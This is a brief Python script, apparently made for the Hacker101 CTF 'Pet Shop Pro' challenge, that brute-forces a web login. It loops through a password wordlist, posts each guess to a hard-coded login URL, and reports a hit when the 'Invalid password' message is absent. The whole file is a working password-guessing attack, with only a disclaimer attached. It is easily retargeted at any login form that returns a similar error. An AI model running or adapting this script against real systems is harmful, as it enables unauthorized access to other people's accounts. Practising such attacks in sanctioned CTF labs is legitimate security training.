# Quick and brutal password enumeration
# Made for Hacker101 CTF - Pet Shop Pro
# I'm not responsible for whatever you do with this

import requests

password_list = 'FILL ME IN'

passwords = [line.rstrip('\n') for line in open(password_list)]

target_url = 'http://35.190.155.168/##########/login' 

password_found = False

for password in passwords:
	if not password_found:
		print('Dorking on password: %s' % password)
		data = {'username':'######','password':password}
		response = requests.post(target_url,data=data)
		response_dork = 'Invalid password'
		if response_dork not in response.text:
			password_found = True
			print('Alert! Password enumerated: %s' % password)
			exit()

print('No valid password found. Exiting!')
exit()
